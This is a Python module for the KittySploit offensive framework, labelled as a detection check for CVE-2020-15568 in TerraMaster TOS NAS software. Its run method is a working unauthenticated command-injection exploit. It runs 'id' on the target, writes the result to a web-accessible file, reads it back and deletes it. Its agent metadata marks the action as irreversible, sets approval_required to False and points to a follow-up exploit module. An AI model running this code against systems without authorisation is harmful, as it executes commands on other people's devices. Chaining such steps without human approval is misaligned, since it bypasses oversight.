#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TerraMaster TOS exportUser.php _exec RCE (CVE-2020-15568)."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TerraMaster TOS - exportUser.php RCE Detection (CVE-2020-15568)',
        'description': (
            'Detects CVE-2020-15568 by executing id via '
            '/include/exportUser.php?type=3&cla=application&func=_exec&opt= and reading '
            'output from /include/<token>.txt.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2020', 'terramaster', 'nas', 'rce',
            'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/linux/http/terramaster_cve_2020_15568_rce',
                ],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2020-15568'],
        'cve': 'CVE-2020-15568',
    }

    def run(self):
        name = secrets.token_hex(6) + '.txt'
        base = '/include/exportUser.php?type=3&cla=application&func=_exec&opt='
        self.http_request(method='GET', path=f'{base}id%3E{name}', allow_redirects=False)
        r = self.http_request(method='GET', path=f'/include/{name}', allow_redirects=False)
        self.http_request(method='GET', path=f'{base}rm%20{name}', allow_redirects=False)
        if r and re.search(r'uid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='TerraMaster exportUser.php RCE (CVE-2020-15568)',
                path='/include/exportUser.php',
            )
            return True
        return False
